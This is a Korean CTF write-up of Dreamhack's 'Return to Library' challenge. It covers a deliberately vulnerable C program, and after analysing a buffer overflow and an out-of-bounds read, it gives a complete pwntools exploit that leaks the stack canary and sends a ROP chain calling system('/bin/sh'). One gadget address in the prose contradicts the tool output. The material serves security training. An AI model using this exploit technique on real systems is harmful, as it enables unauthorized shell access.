# Return to Library - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: rtl.c, rtl(ELF)
- tools: gdb(pwndbg)
## Brief Description
Exploit Tech: Return to Library에서 실습하는 문제입니다.
## Initial Analysis
### Environment
``` sh
checksec --file=rtl
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
### Code
``` c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```
`system`의 PLT를 출력한다. 이후 사용자로부터 2번의 입력을 받는다.  
ELF는 사용하는 함수에 대해서만 PLT에 등록하는데, 바이너리 내부에서 `system`을 사용하기 때문에 `system` 함수의 PLT가 존재한다.  
또한 전역변수에 `"/bin/sh"`가 존재한다.  
## Vulnerability
### BOF(Buffer Overflow)
``` c
read(0, buf, 0x100);
```
`buf`의 크기는 0x30인 반면, `read`로 읽어오는 크기는 0x100이다. 이로인해 BOF 취약점이 발생하며 총 2번의 취약점이 발생한다.
### OOB(Out Of Bounds)
``` c
printf("Buf: %s\n", buf);
```
첫 번째 BOF 취약점 이후, `buf`를 출력한다. 만일 NULL-byte가 `buf` 내부에 없을 경우 OOB 취약점이 발생한다.  
## Exploit
### Strategy
PIE는 비활성화 되어있어 함수의 주소는 바뀌지 않지만, canary가 활성화 되어있어 canary leak으로 우회가 필요하다.  
각 한 번의 BOF와 OOB를 통해 canary 값을 leak하고, 두 번째 BOF를 통해 canary를 우회하여 최종적으로 Return to Libc 공격을 수행할 수 있다. canary leak을 할 때, canary의 LSB는 NULL-byte이므로 해당 값까지 덮어써야 leak을 할 수 있다. 왜냐하면 printf() 함수는 NULL-byte를 만날 때까지 출력하는데, little endian으로 인해 스택 카나리의 LSB인 NULL-byte가 낮은 주소에 있으므로 NULL-byte를 덮어쓰지 않으면 canary leak을 할 수 없다.  
공격에 필요한 정보는 다음과 같다.  
| 정보 | 역할 | 확보 방법 |
| --- | --- | --- |
| system_PLT | system 호출 | pwndbg> plt |
| "/bin/sh" addr | system 함수 인자 | pwndbg> search /bin/sh |
| pop_rdi | system 인자를 레지스터에 전달 | ROPgadget --binary ./rtl --re "pop rdi" |
| ret | 스택 정렬 | ROPgadget --binary=./rtl \| grep ": ret" |

> 주의점  
`system()` 함수로 rip가 이동할 때, 스택은 반드시 0x10 단위로 정렬되어 있어야 한다. 이는 system 함수 내부에 있는 `movaps` 명령어 때문인데, 이 명령어는 스택이 0x10 단위로 정렬되어 있지 않으면 Segmentation Fault를 발생시킨다. `movaps` 명령어는 하드웨어 수준에서 데이터 처리 속도를 극대화하기 위해 만들어진 명령어인데, 설계 자체가 '데이터는 반드시 16바이트로 정렬되어 있어야 한다'를 전제로 하고 있기 때문이다.  
따라서 `system()` 함수를 이용한 익스플로잇을 작성할 때 Segmentation Fault가 발생한다면(익스플로잇을 잘 작성하였다고 가정했을 때), `ret`과 같은 아무 의미 없는 가젯(no-op gadget)을 이용해 한번 system 함수의 가젯을 8바이트 뒤로 미뤄보면 좋다.
### Exploitation Steps
``` sh
pwndbg> plt
Section .plt 0x4005a0 - 0x400610:
0x4005b0: puts@plt
0x4005c0: __stack_chk_fail@plt
0x4005d0: system@plt
0x4005e0: printf@plt
0x4005f0: read@plt
0x400600: setvbuf@plt
```
`system()`의 plt가 `0x4005d0`인 것을 확인할 수 있다.  
``` sh
pwndbg> search /bin/sh
Searching for byte: b'/bin/sh'
rtl             0x400874 0x68732f6e69622f /* '/bin/sh' */
rtl             0x600874 0x68732f6e69622f /* '/bin/sh' */
libc.so.6       0x7ffff7f62678 0x68732f6e69622f /* '/bin/sh' */
```
`"/bin/sh"`의 주소(`0x400874`)를 확인할 수 있다.  
``` sh
$ ROPgadget --binary ./rtl --re "pop rdi"
Gadgets information
============================================================
0x0000000000400853 : pop rdi ; ret

Unique gadgets found: 1
```
`pop rdi` 가젯 주소가 `0x0000000000400596`인 것을 확인할 수 있다.  
``` sh
$ ROPgadget --binary ./rtl --re "ret"
0x0000000000400596 : ret
```
`ret` 가젯의 주소를 확인할 수 있다.  
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | +0x8 |
| rbp |  |
| canary | -0x8 |
| dummy | -0x10 |
| buf | -0x40 |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 18644)
context.arch = "amd64"

system_plt = 0x4005d0
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400596

# leak canary
leak_canary = b''
leak_canary += b'A' * 0x39 # to cover the canary NULL-byte, 0x38 + 0x1
p.sendafter(b'Buf: ', leak_canary)
p.recvuntil(leak_canary) # 내가 입력한 부분까지 받아옴
canary = u64(b'\x00' + p.recvn(7))
log.info(f'leaked canary: {canary}')

# exploit
payload = b''
payload += b'A' * 0x38 # buf + dummy
payload += p64(canary) # canary
payload += b'B' * 0x8 # rbp
payload += p64(ret) # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
pause()
p.sendafter(b'Buf: ', payload)

# sh
p.interactive()
```